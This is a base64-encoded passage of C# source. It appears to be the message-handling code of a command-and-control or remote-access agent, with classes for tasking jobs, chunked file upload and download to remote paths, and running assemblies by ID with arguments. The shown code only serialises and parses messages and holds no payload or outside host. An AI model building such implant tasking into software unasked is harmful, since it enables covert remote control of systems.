XRwdXQiIjoiInsxfSIiLCIic3RhdHVzIiI6IiJ7Mn0iIiwiImNvbXBsZXRlZCIiOiIiezN9IiIsIiJlcnJvciIiOiIiezR9IiIsIiJ0b3RhbF9jaHVua3MiIjoiIns1fSIiLCIiZnVsbF9wYXRoIiI6IiJ7Nn0iIiwiImNodW5rX251bSIiOiIiezd9IiIsIiJjaHVua19kYXRhIiI6IiJ7OH0iIiwiImZpbGVfaWQiIjoiIns5fSIifX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBUb0pzb24oVGFza1Jlc3BvbnNlIHRhc2tfcmVzcG9uc2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgc3RyaW5nIEZvcm1hdCA9IHRhc2tfcmVzcG9uc2UuSnNvbkZvcm1hdDsNCiAgICAgICAgICAgICAgICBpZiAodGFza19yZXNwb25zZS51c2VyX291dHB1dCA9PSBudWxsKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdGFza19yZXNwb25zZS51c2VyX291dHB1dCA9ICIiOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAodGFza19yZXNwb25zZS5jb21wbGV0ZWQgPT0gbnVsbCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRhc2tfcmVzcG9uc2UuY29tcGxldGVkID0gIiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICh0YXNrX3Jlc3BvbnNlLmVycm9yID09IG51bGwpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB0YXNrX3Jlc3BvbnNlLmVycm9yID0gIiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICh0YXNrX3Jlc3BvbnNlLnN0YXR1cyA9PSBudWxsKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdGFza19yZXNwb25zZS5zdGF0dXMgPSAiIjsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgc3RyaW5nIHRvdGFsX2NodW5rczsNCiAgICAgICAgICAgICAgICBpZiAodGFza19yZXNwb25zZS50b3RhbF9jaHVua3MgPT0gbnVsbCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIEZvcm1hdCA9IHRhc2tfcmVzcG9uc2UuSnNvbkZvcm1hdDE7DQogICAgICAgICAgICAgICAgICAgIHRvdGFsX2NodW5rcyA9ICIiOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBGb3JtYXQgPSB0YXNrX3Jlc3BvbnNlLkpzb25Gb3JtYXQyOw0KICAgICAgICAgICAgICAgICAgICB0b3RhbF9jaHVua3MgPSB0YXNrX3Jlc3BvbnNlLnRvdGFsX2NodW5rcy5Ub1N0cmluZygpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAodGFza19yZXNwb25zZS5mdWxsX3BhdGggPT0gbnVsbCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRhc2tfcmVzcG9uc2UuZnVsbF9wYXRoID0gIiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHN0cmluZyBjaHVua19udW07DQogICAgICAgICAgICAgICAgaWYgKHRhc2tfcmVzcG9uc2UuY2h1bmtfbnVtID09IG51bGwpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBpZiAoRm9ybWF0ICE9IHRhc2tfcmVzcG9uc2UuSnNvbkZvcm1hdDIpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIEZvcm1hdCA9IHRhc2tfcmVzcG9uc2UuSnNvbkZvcm1hdDM7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gIiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmIChGb3JtYXQgIT0gdGFza19yZXNwb25zZS5Kc29uRm9ybWF0MikNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgRm9ybWF0ID0gdGFza19yZXNwb25zZS5Kc29uRm9ybWF0MTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSB0YXNrX3Jlc3BvbnNlLmNodW5rX251bS5Ub1N0cmluZygpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAodGFza19yZXNwb25zZS5jaHVua19kYXRhID09IG51bGwpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB0YXNrX3Jlc3BvbnNlLmNodW5rX2RhdGEgPSAiIjsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKHRhc2tfcmVzcG9uc2UuZmlsZV9pZCA9PSBudWxsKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdGFza19yZXNwb25zZS5maWxlX2lkID0gIiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBTdHJpbmcuRm9ybWF0KA0KICAgICAgICAgICAgICAgICAgICBGb3JtYXQsDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodGFza19yZXNwb25zZS50YXNrX2lkKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh0YXNrX3Jlc3BvbnNlLnVzZXJfb3V0cHV0KSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh0YXNrX3Jlc3BvbnNlLnN0YXR1cyksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodGFza19yZXNwb25zZS5jb21wbGV0ZWQpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHRhc2tfcmVzcG9uc2UuZXJyb3IpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHRvdGFsX2NodW5rcyksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodGFza19yZXNwb25zZS5mdWxsX3BhdGgpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKGNodW5rX251bSksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodGFza19yZXNwb25zZS5jaHVua19kYXRhKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh0YXNrX3Jlc3BvbnNlLmZpbGVfaWQpDQogICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBSZXNwb25zZQ0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHRhc2tfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBzdGF0dXMgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBlcnJvciB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGZpbGVfaWQgeyBnZXQ7IHNldDt9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFJlc3BvbnNlU3VjY2Vzc0Zvcm1hdCA9IEAie3siInN0YXR1cyIiOiAiInswfSIiLCAiInRhc2tfaWQiIjogIiJ7MX0iIn19IjsNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFJlc3BvbnNlRXJyb3JGb3JtYXQgPSBAInt7IiJzdGF0dXMiIjogIiJ7MH0iIiwgIiJ0YXNrX2lkIiI6ICIiezF9IiIsICIiZXJyb3IiIjogIiJ7Mn0iIn19IjsNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFJlc3BvbnNlRG93bmxvYWRGb3JtYXQgPSBAInt7IiJzdGF0dXMiIjogIiJ7MH0iIiwgIiJ0YXNrX2lkIiI6ICIiezF9IiIsICIiZmlsZV9pZCIiOiAiInsyfSIifX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8c3RyaW5nPiBQYXJzZVN1Y2Nlc3Moc3RyaW5nIGRhdGEsIHN0cmluZyBmb3JtYXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9ybWF0ID0gUmVnZXguRXNjYXBlKGZvcm1hdCkuUmVwbGFjZSgiXFx7IiwgInsiKTsNCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MH0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezB9IiwgIig\/J2dyb3VwMCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsxfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MX0iLCAiKD8nZ3JvdXAxJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgTWF0Y2ggbWF0Y2ggPSBuZXcgUmVnZXgoZm9ybWF0KS5NYXRjaChkYXRhKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8c3RyaW5nPiBQYXJzZUVycm9yKHN0cmluZyBkYXRhLCBzdHJpbmcgZm9ybWF0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcm1hdCA9IFJlZ2V4LkVzY2FwZShmb3JtYXQpLlJlcGxhY2UoIlxceyIsICJ7Iik7DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezB9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInswfSIsICIoPydncm91cDAnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezF9IiwgIig\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsyfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7Mn0iLCAiKD8nZ3JvdXAyJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgTWF0Y2ggbWF0Y2ggPSBuZXcgUmVnZXgoZm9ybWF0KS5NYXRjaChkYXRhKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMiJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDIiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbWF0Y2hlczsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PFJlc3BvbnNlPiBQYXJzZVJlc3BvbnNlcyhzdHJpbmcgcmVzcG9uc2VzX2pzb24pDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKHJlc3BvbnNlc19qc29uID09ICJbXSIpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gbnVsbDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2VzX2pzb24gPSByZXNwb25zZXNfanNvbi5SZXBsYWNlKCJbIiwgQCIiKS5SZXBsYWNlKCJdIiwgQCIiKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgTGlzdDxSZXNwb25zZT4gcmVzcG9uc2VzID0gbmV3IExpc3Q8UmVzcG9uc2U+KCk7DQogICAgICAgICAgICAgICAgc3RyaW5nW10gcmVzcG9uc2VzX3NwbGl0ID0gcmVzcG9uc2VzX2pzb24uU3BsaXQobmV3W10geyAifSwiIH0sIFN0cmluZ1NwbGl0T3B0aW9ucy5SZW1vdmVFbXB0eUVudHJpZXMpOw0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKHN0cmluZyByZXNwb25zZSBpbiByZXNwb25zZXNfc3BsaXQpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gcGFyc2VMaXN0ID0gbmV3IExpc3Q8c3RyaW5nPiB7IH07DQogICAgICAgICAgICAgICAgICAgIGlmIChyZXNwb25zZS5Db250YWlucygiZXJyb3IiKSkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2VMaXN0ID0gUmVzcG9uc2UuUGFyc2VFcnJvcihyZXNwb25zZSwgUmVzcG9uc2VFcnJvckZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gMykgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UgbmV3X3Jlc3BvbnNlID0gbmV3IFJlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gcGFyc2VMaXN0WzBdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBwYXJzZUxpc3RbMV0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3IgPSBwYXJzZUxpc3RbMl0NCiAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICByZXNwb25zZXMuQWRkKG5ld19yZXNwb25zZSk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAocmVzcG9uc2UuQ29udGFpbnMoImZpbGVfaWQiKSkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2VMaXN0ID0gUmVzcG9uc2UuUGFyc2VFcnJvcihyZXNwb25zZSwgUmVzcG9uc2VEb3dubG9hZEZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gMykgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UgbmV3X3Jlc3BvbnNlID0gbmV3IFJlc3BvbnNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzID0gcGFyc2VMaXN0WzBdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tfaWQgPSBwYXJzZUxpc3RbMV0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9pZCA9IHBhcnNlTGlzdFsyXQ0KICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlcy5BZGQobmV3X3Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlTGlzdCA9IFJlc3BvbnNlLlBhcnNlU3VjY2VzcyhyZXNwb25zZSArICJ9IiwgUmVzcG9uc2VTdWNjZXNzRm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2VMaXN0LkFkZCgiIik7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0LkNvdW50ICE9IDMpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlIG5ld19yZXNwb25zZSA9IG5ldyBSZXNwb25zZQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1cyA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gcGFyc2VMaXN0WzFdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yID0gcGFyc2VMaXN0WzJdDQogICAgICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2VzLkFkZChuZXdfcmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiByZXNwb25zZXM7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgSm9iTGlzdA0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgaW50IGpvYl9jb3VudCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgTGlzdDxKb2I+IGpvYnMgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgSm9iTGlzdCgpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgam9icyA9IG5ldyBMaXN0PEpvYj4oKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBKb2INCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIGludCBqb2JfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyB0YXNrX2lkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBib29sIGNvbXBsZXRlZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgYm9vbCBqb2Jfc3RhcnRlZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgYm9vbCBzdWNjZXNzIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgY29tbWFuZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHBhcmFtZXRlcnMgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyByZXNwb25zZSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgVGhyZWFkIHRocmVhZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgYm9vbCB1cGxvYWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGJvb2wgZG93bmxvYWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGJvb2wgY2h1bmtpbmdfc3RhcnRlZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgaW50IHRvdGFsX2NodW5rcyB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgaW50IGNodW5rX251bSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgaW50IHdyaXRlX251bSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGZpbGVfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGxvbmcgZmlsZV9zaXplIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgcGF0aCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgTGlzdDxzdHJpbmc+IGNodW5rcyB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBKb2IoKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGNodW5rcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBVcGxvYWRUYXNraW5nDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYXNzZW1ibHlfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyByZW1vdGVfcGF0aCB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFVwbG9hZFRhc2tpbmdGb3JtYXQgPSBAIiIiYXNzZW1ibHlfaWQiIjogIiJ7MH0iIiwgIiJyZW1vdGVfcGF0aCIiOiAiInsxfSIiIjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gUGFyc2Uoc3RyaW5nIGRhdGEsIHN0cmluZyBmb3JtYXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9ybWF0ID0gUmVnZXguRXNjYXBlKGZvcm1hdCkuUmVwbGFjZSgiXFwiLCBAIiIpOw0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInswfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MH0iLCAiKD8nZ3JvdXAwJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezF9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsxfSIsICIoPydncm91cDEnLiopIik7IH0NCiAgICAgICAgICAgICAgICBNYXRjaCBtYXRjaCA9IG5ldyBSZWdleChmb3JtYXQpLk1hdGNoKGRhdGEuUmVwbGFjZShAIlwiLCBAIiIpKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIFVwbG9hZFRhc2tpbmcgRnJvbUpzb24oc3RyaW5nIG1lc3NhZ2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IHBhcnNlTGlzdCA9IFVwbG9hZFRhc2tpbmcuUGFyc2UobWVzc2FnZSwgVXBsb2FkVGFza2luZ0Zvcm1hdCk7DQogICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdC5Db3VudCAhPSAyKSB7IHJldHVybiBudWxsOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBVcGxvYWRUYXNraW5nDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhc3NlbWJseV9pZCA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgcmVtb3RlX3BhdGggPSBwYXJzZUxpc3RbMV0NCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIFJ1bkFzc2VtYmx5DQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYXJncyB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGFzc2VtYmx5X2lkIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgUnVuQXNzZW1ibHlGb3JtYXQgPSBAIiIiYXNzZW1ibHlfaWQiIjogIiJ7MH0iIiwgIiJhcmdzIiI6ICIiezF9IiIiOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8c3RyaW5nPiBQYXJzZShzdHJpbmcgZGF0YSwgc3RyaW5nIGZvcm1hdCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JtYXQgPSBSZWdleC5Fc2NhcGUoZm9ybWF0KS5SZXBsYWNlKCJcXCIsIEAiIik7DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezB9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInswfSIsICIoPydncm91cDAnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezF9IiwgIig\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YS5SZXBsYWNlKEAiXCIsIEAiIikpOw0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBtYXRjaGVzID0gbmV3IExpc3Q8c3RyaW5nPigpOw0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMCJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDAiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDEiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoZXM7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgUnVuQXNzZW1ibHkgRnJvbUpzb24oc3RyaW5nIG1lc3NhZ2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IHBhcnNlTGlzdCA9IFJ1bkFzc2VtYmx5LlBhcnNlKG1lc3NhZ2UsIFJ1bkFzc2VtYmx5Rm9ybWF0KTsNCiAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0LkNvdW50ICE9IDIpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFJ1bkFzc2VtYmx5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhcmdzID0gcGFyc2VMaXN0WzFdLA0KICAgICAgICAgICAgICAgICAgICBhc3NlbWJseV9pZCA9IHBhcnNlTGlzdFswXQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgVXBsb2FkDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYWN0aW9uIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQgY2h1bmtfc2l6ZSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGZpbGVfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGludCBjaHVua19udW0geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBmdWxsX3BhdGggeyBnZXQ7IHNldDsgfQ0